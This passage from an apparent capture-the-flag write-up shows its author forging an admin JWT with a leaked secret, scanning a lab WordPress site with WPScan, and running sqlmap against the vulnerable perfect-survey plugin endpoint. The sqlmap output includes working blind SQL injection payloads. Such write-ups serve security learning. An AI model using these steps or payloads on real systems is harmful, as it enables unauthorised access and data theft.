style=color:#e6db74>&#34;http://192.168.1.145:5000/admin&#34;</span></span></span></code></pre></div><p>Returns:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;Missing Authorization Header&#34;</span>}</span></span></code></pre></div><p>nothing to see here&mldr; for now&mldr;</p><p>Remember the GitHub&rsquo;s README?</p><p><img src=/images/ctfs/schneidelec/api.png alt=API></p><p>This comes handy&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145:5000/register&#34;</span> --header <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> --data-raw <span style=color:#e6db74>&#39;{&#34;username&#34;: &#34;challenge_rules_suck&#34;, &#34;password&#34;: &#34;suck_a_lot&#34;}&#39;</span></span></span></code></pre></div><p>Returns:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;Message&#34;</span>: <span style=color:#e6db74>&#34;Username has been created! Now you can successfully login.&#34;</span>}</span></span></code></pre></div><p>so&mldr; let&rsquo;s login?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145:5000/login&#34;</span> --header <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> --data-raw <span style=color:#e6db74>&#39;{&#34;username&#34;: &#34;challenge_rules_suck&#34;, &#34;password&#34;: &#34;suck_a_lot&#34;}&#39;</span></span></span></code></pre></div><p>Returns:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;access_token&#34;</span>:  <span style=color:#e6db74>&#34;very_large_jwt_token&#34;</span>}</span></span></code></pre></div><p>hmm&mldr;</p><p>Maybe&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145:5000/logout&#34;</span></span></span></code></pre></div><p>404&mldr; I guess we&rsquo;re stuck w/ the challenge_rules_suck account forever ;)</p><p>Let&rsquo;s head over to <a href=https://jwt.io/>jwt.io</a> to inspect the token.</p><p><img src=/images/ctfs/schneidelec/vjwt.png alt=VJWT></p><p>Let&rsquo;s change the &ldquo;sub&rdquo; key w/ &ldquo;admin&rdquo;; input their leaked JWT secret and use the resulting token to log in.</p><p><img src=/images/ctfs/schneidelec/cjwt.png alt=CJWT></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145:5000/admin&#34;</span> --header <span style=color:#e6db74>&#34;Authorization: Bearer that_long_token_we_just_got&#34;</span></span></span></code></pre></div><p>Returns:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;Flag&#34;</span>:  <span style=color:#e6db74>&#34;API_FLAG{Never_public_your_secret}&#34;</span>, <span style=color:#f92672>&#34;Message&#34;</span>:<span style=color:#e6db74>&#34;Oh hello again dear Administrator&#34;</span>}</span></span></code></pre></div><p>Bingo: <code>API_FLAG{Never_public_your_secret}</code></p><p>Alright, let&rsquo;s continue; <code>Wappalyzer</code> browser extension lists a website&rsquo;s building blocks; and it lists WordPress&mldr;</p><p>One thing I learned from various CTFs is that WordPress is (If not done right) one of the most vulnerable-prone frameworks that exist, it having plugins makes it even more of a sticky-icky situation.</p><p>Thanks to this (Curiously) <a href=https://apageinsec.wordpress.com/2019/04/03/raven-1-walkthrough/>WordPress blog entry</a> I found out that there&rsquo;s a tool called WPScan that is able to
+perform blackbox auditing on a remote WordPress website; so, what I did next is; install the tool and run a quick scan targetting the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ wpscan --url https://wp.geohome.com/</span></span></code></pre></div><p>Strange&mldr; :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Scan Aborted: The url supplied <span style=color:#e6db74>&#39;https://wp.geohome.com/&#39;</span> seems to be down <span style=color:#f92672>(</span>SSL peer certificate or SSH remote key was not OK<span style=color:#f92672>)</span></span></span></code></pre></div><p>The URL is definitely up, as I&rsquo;m able to enter it without problems, but I remember facing a warning on Firefox the first time I accessed it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wp.geohome.com uses an invalid security certificate.&lt;br&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The certificate is not trusted because it is self-signed.&lt;br&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Error code: MOZILLA_PKIX_ERROR_SELF_SIGNED_CERT&lt;br&gt;</span></span></code></pre></div><p>Maybe this is related? I jumped on DuckDuck and found <a href=https://github.com/wpscanteam/wpscan/issues/1380#issuecomment-525762380>a GitHub link</a> with a possible workaround, so I went ahead and tried it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ wpscan --url https://wp.geohome.com/ --disable-tls-checks</span></span></code></pre></div><details><summary>WPScan Output:</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_______________________________________________________________
+</span></span><span style=display:flex><span>__          _______   _____
+</span></span><span style=display:flex><span><span style=color:#ae81ff>\ \ </span>       / /  __ <span style=color:#ae81ff>\ </span>/ ____|
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>\ \ </span> /<span style=color:#ae81ff>\ </span> / /| |__<span style=color:#f92672>)</span> | <span style=color:#f92672>(</span>___   ___  __ _ _ __ ®
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>\ \/</span>  <span style=color:#ae81ff>\/</span> / |  ___/ <span style=color:#ae81ff>\_</span>__ <span style=color:#ae81ff>\ </span>/ __|/ _<span style=color:#e6db74>`</span> | <span style=color:#e6db74>&#39;_ \
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>WordPress Security Scanner by the WPScan Team
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Version 3.8.22
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  Sponsored by Automattic - https://automattic.com/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_______________________________________________________________
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] URL: https://wp.geohome.com/ [192.168.1.145]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] Started: Sun May 22 21:37:08 2022
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Interesting Finding(s):
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] Headers
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Interesting Entries:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - server: Microsoft-IIS/10.0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - x-powered-by: PHP/8.0.0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Headers (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confidence: 100%
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] robots.txt found: https://wp.geohome.com/robots.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Interesting Entries:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - /wp-admin/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - /wp-admin/admin-ajax.php
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Robots Txt (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confidence: 100%
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] XML-RPC seems to be enabled: https://wp.geohome.com/xmlrpc.php
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confidence: 100%
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| References:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] WordPress readme found: https://wp.geohome.com/readme.html
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confidence: 100%
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] The external WP-Cron seems to be enabled: https://wp.geohome.com/wp-cron.php
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confidence: 60%
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| References:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] WordPress version 5.9.3 identified (Latest, released on 2022-04-05).
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Rss Generator (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://wp.geohome.com/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.3&lt;/generator&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://wp.geohome.com/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.3&lt;/generator&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] WordPress theme in use: twentytwentytwo
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Location: https://wp.geohome.com/wp-content/themes/twentytwentytwo/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Latest Version: 1.1 (up to date)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Last Updated: 2022-02-25T00:00:00.000Z
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Readme: https://wp.geohome.com/wp-content/themes/twentytwentytwo/readme.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Style URL: https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Style Name: Twenty Twenty-Two
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Style URI: https://wordpress.org/themes/twentytwentytwo/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Author: the WordPress team
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Author URI: https://wordpress.org/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confirmed By: Css Style In 404 Page (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Version: 1.1 (80% confidence)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Style (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: &#39;</span>Version: 1.1<span style=color:#e6db74>&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] Enumerating All Plugins (via Passive Methods)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] Plugin(s) Identified:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] bdthemes-element-pack-lite
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Location: https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Last Updated: 2022-05-21T12:23:00.000Z
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| [!] The version is out of date, the latest version is 4.2.1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Urls In Homepage (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confirmed By: Urls In 404 Page (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Version: 4.1.0 (80% confidence)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Readme - Stable Tag (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/readme.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[+] elementor
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Location: https://wp.geohome.com/wp-content/plugins/elementor/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Latest Version: 3.6.5 (up to date)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Last Updated: 2022-04-27T13:20:00.000Z
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Urls In Homepage (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Version: 3.6.5 (100% confidence)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Found By: Query Parameter (Passive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.6.5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>| Confirmed By:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  Readme - Stable Tag (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   - https://wp.geohome.com/wp-content/plugins/elementor/readme.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|  Javascript Comment (Aggressive Detection)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: &#39;</span>elementor - v3.6.5<span style=color:#960050;background-color:#1e0010>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> perfect-survey
+</span></span><span style=display:flex><span>| Location: https://wp.geohome.com/wp-content/plugins/perfect-survey/
+</span></span><span style=display:flex><span>| Latest Version: 1.5.1 <span style=color:#f92672>(</span>up to date<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| Last Updated: 2021-06-11T12:09:00.000Z
+</span></span><span style=display:flex><span>|
+</span></span><span style=display:flex><span>| Found By: Urls In Homepage <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| Confirmed By: Urls In <span style=color:#ae81ff>404</span> Page <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|
+</span></span><span style=display:flex><span>| Version: 1.5.1 <span style=color:#f92672>(</span>80% confidence<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| Found By: Readme - Stable Tag <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|  - https://wp.geohome.com/wp-content/plugins/perfect-survey/readme.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> pro-elements
+</span></span><span style=display:flex><span>| Location: https://wp.geohome.com/wp-content/plugins/pro-elements/
+</span></span><span style=display:flex><span>|
+</span></span><span style=display:flex><span>| Found By: Urls In Homepage <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|
+</span></span><span style=display:flex><span>| The version could not be determined.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Enumerating Config Backups <span style=color:#f92672>(</span>via Passive and Aggressive Methods<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Checking Config Backups - Time: 00:00:31 &lt;<span style=color:#f92672>===============================================================================================================</span>&gt; <span style=color:#f92672>(</span><span style=color:#ae81ff>137</span> / 137<span style=color:#f92672>)</span> 100.00% Time: 00:00:31
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> No Config Backups Found.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> You can get a free API token with <span style=color:#ae81ff>25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Finished: Sun May <span style=color:#ae81ff>22</span> 21:37:44 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Requests Done: <span style=color:#ae81ff>159</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Cached Requests: <span style=color:#ae81ff>30</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Data Sent: 47.619 KB
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Data Received: 569.914 KB
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Memory used: 234.621 MB
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Elapsed time: 00:00:36</span></span></code></pre></div></details><p>We could try looking for Vulns in each out-to-date plugin, let&rsquo;s do that:</p><p><code>bdthemes-element-pack-lite</code> looks outdated, but there are no known vulns so we don&rsquo;t have much left to check.</p><p>Let&rsquo;s try with updated plugins:</p><p><code>elementor</code>? Nope, <code>perfect-survey</code>?</p><p><img src=/images/ctfs/schneidelec/exploit.png alt=Exploit></p><p><a href=https://www.exploit-db.com/exploits/50766>Bingo!</a></p><p>So the provided exploit-db&rsquo;s exploit uses <code>sqlmap</code> to exploit the vulnerability</p><p>Let&rsquo;s use that:</p><p>In the same fashion as HackUPC challenges, I needed to open BURP and specify the &ndash;proxy option to sqlmap in order for exploit-db&rsquo;s command to work:</p><p>Fun fact: The machine BSOD while I was running SQLMap :D</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --proxy<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;127.0.0.1:8080&#34;</span></span></span></code></pre></div><details><summary>SQLMap Output:</summary>><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>        ___
+</span></span><span style=display:flex><span>       __H__
+</span></span><span style=display:flex><span> ___ ___<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;]_____ ___ ___  {1.6.6#stable}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_ -| . [&#39;]     | .&#39;| . |
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|___|_  [&#39;]_|_|_|__,|  _|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] starting @ 15:25:05 /2022-05-22/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>custom injection marker (&#39;*&#39;) found in option &#39;-u&#39;. Do you want to process it? [Y/n/q] Y
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:07] [INFO] testing connection to the target URL
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>you have not declared cookie(s), while server wants to set its own (&#39;wp-ps-session=ckshrftg341...9l2980fo6c&#39;). Do you want to use those [Y/n] Y
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:09] [INFO] testing if the target URL content is stable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [INFO] target URL content is stable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [INFO] testing if URI parameter &#39;#1*&#39; is dynamic
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [WARNING] URI parameter &#39;#1*&#39; does not appear to be dynamic
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [WARNING] heuristic (basic) test shows that URI parameter &#39;#1*&#39; might not be injectable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [INFO] testing for SQL injection on URI parameter &#39;#1*&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:10] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:11] [WARNING] reflective value(s) found and filtering out
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:12] [INFO] URI parameter &#39;#1*&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --code=200)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39; 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] n
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:19] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:19] [INFO] testing &#39;Generic inline queries&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:20] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:20] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)   
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:34] [INFO] URI parameter &#39;#1*&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:34] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:35] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:25:36] [INFO] target URL appears to have 16 columns in query
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] n
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:09] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. &#39;--union-char=1&#39;) and/or try to force the back-end DBMS (e.g. &#39;--dbms=mysql&#39;) 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:14] [INFO] target URL appears to be UNION injectable with 16 columns
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] n
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:40] [INFO] checking if the injection point on URI parameter &#39;#1*&#39; is a false positive
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>URI parameter &#39;#1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>sqlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Parameter: #1* (URI)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Type: boolean-based blind
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1  AND 4443=4443
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Type: time-based blind
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1  AND (SELECT 2743 FROM (SELECT(SLEEP(5)))iLzk)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[15:26:45] [INFO] the back-end DBMS is MySQL
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>web server operating system: Windows 2019 or 10 or 2016
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>web application technology: PHP 8.0.0, Microsoft IIS 10.0
